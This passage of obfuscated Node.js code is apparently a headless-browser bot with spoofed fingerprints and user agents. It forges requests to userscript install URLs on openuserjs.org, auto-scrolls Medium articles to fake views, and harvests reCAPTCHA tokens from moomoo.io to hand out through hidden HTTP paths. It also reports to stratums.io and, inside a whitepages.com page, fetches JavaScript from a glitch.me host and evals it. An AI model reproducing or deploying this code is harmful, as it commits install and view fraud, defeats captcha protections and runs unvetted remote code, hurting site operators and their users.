      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + V(0xe) + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': V(0x2) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + V(0x1) + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + V(0x14) + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    V(0x13) + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + T(0xc) + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1f7 + -0x24ac * 0x1 + -0x26a3 * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x6 * -0x470 + 0x2 * -0x655 + -0x13a5 * -0x2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x669 * -0x2 + -0x15c1 * -0x1 + -0x88b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1d5 + 0x73 * 0x49 + 0x1c * -0x139), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1176 + -0x2 * 0x3a6 + -0xa2a;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x50 * 0x63 + -0x1 * 0x1dd5 + 0x1 * -0x11b; w < getRandomInt(0x343 * 0x1 + -0x1ec + -0x156, 0x69d * -0x1 + 0x3 * 0x37e + -0x7b * 0x8); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x17e1 * 0x7 + 0x9c * 0x7c + -0x1ab * 0x5);
        }
      }();
    }, 0x248d * -0x1 + -0x267c + -0x1 * -0x4b6d), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const W = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1e03 + 0x8dd + -0x2 * -0xa93;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })[W(0x8)](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x3f2 + -0xfae + 0x20 * 0x9d, 0x112b * 0x2 + -0x2095 + -0x18f)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x471c + -0x7 * 0x1b93 + 0x17d51);
    }, 0x4b * 0x7e + 0x17de + -0x305 * 0x14), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2264 * -0x1 + 0x1 * -0x107 + 0x236b * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * 0x327 + 0x12b * 0xc + -0x1 * 0x573), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x217 * -0x1 + 0x1c6e + -0x1a57), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x137e28 + -0x4380 * 0x41 + 0xb60f8);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * 0xa6e + 0xe14 + 0x93 * -0x2a);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1965 + 0xa55 + -0x1 * -0xfd8);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x3e86 + 0x1223 * -0x2 + -0x88 * -0xa);
}
doFlags['doOUJS'] && ((async () => {
  const Y = b,
    X = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x26f9 + 0x4da + 0x2220) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0xb0d * 0x1 + -0x2 * 0x5e1 + 0xb6));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x11b8 + 0x15e6 + -0x42e, D['indexOf']('\x20'));
        return B ? E['slice'](-0x3 * 0x2d7 + -0x467 * 0x2 + 0x1153, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x17 * 0x109 + -0x124b + 0x512a),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x4c * -0x98 + -0xd08 * 0x1 + -0xdf * -0x8),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + X(0x0) + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      Y(0x4, 'aegi') + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + X(0x9) + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x3 * -0xc3 + -0x14dc + 0x1725; k < 0x18f8 + -0xb4e + 0x1 * -0xda6; k++)
    setTimeout(f, (0x26a4 + 0x1860b + -0xc24f) * k * getRandomInt(0x1ac1 + 0x659 + -0x2119, 0x5f + 0x355 * -0x3 + -0x9a3 * -0x1));
  setInterval(() => {
    f();
    for (let l = 0xc7d + -0xb * 0x184 + 0x42f; l < 0x22c2 + -0x25d6 + 0x318; l++)
      setTimeout(f, (0x1 * 0x70a + 0xdea4 * 0x2 + -0xd9f2) * l * getRandomInt(-0x1f43 * 0x1 + -0xfb2 + 0x2ef6, 0x124 * -0x19 + -0x1 * -0x10eb + 0xb9c));
  }, -0x6a6dc6 + -0x8347 * 0x8b + -0x4d8bf1 * -0x3);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    const Z = d;
    f['get'](miscSites[Z(0x3)](), {
      'timeout': 0x0,
